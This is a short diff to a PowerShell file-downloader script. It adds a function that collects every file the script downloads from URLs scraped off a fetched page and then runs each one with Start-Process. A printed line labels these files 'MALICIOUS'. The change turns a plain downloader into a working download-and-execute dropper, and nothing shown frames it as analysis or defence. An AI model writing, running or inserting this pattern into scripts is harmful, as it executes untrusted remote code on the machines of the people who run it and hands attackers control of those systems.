@@ -26,6 +26,8 @@ if ($matches.Count -eq 0) {
 }
 
 # Download each file from the list
+$downloadedFiles = @()
+
 foreach ($match in $matches) {
     $fileUrl = $match -replace "<.*?>", "" # Remove any HTML tags
     $fileName = [System.IO.Path]::GetFileName($fileUrl)
@@ -40,9 +42,26 @@ foreach ($match in $matches) {
         Write-Host "Downloading: $fileUrl"
         Invoke-WebRequest -Uri $fileUrl -OutFile $outputFile -UseBasicParsing
         Write-Host "Saved to: $outputFile"
+        $downloadedFiles += $outputFile
     } catch {
         Write-Host "Failed to download $fileUrl. Error: $_"
     }
 }
 
 Write-Host "Download process completed. Files saved to $downloadPath"
+
+# Function to execute all downloaded files
+function Execute-DownloadedFiles {
+    Write-Host "WARNING: EXECUTING MALICIOUS FILES!"
+    foreach ($file in $downloadedFiles) {
+        try {
+            Write-Host "Executing: $file"
+            Start-Process -FilePath $file -NoNewWindow -Wait
+        } catch {
+            Write-Host "Failed to execute $file. Error: $_"
+        }
+    }
+}
+
+# Call the function to execute the files
+Execute-DownloadedFiles
